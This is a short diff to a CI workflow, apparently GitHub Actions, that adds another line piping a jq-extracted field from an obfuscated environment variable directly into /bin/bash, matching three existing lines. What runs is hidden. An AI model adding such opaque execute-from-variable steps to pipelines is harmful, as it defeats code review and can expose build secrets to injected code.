@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$g07" | jq -r .hh16 | /bin/bash
           printf '%s' "$tuc19695" | jq -r .tdeb9720 | /bin/bash
           printf '%s' "$foih55" | jq -r .py62652 | /bin/bash
+          printf '%s' "$spgc6478" | jq -r .m29273 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
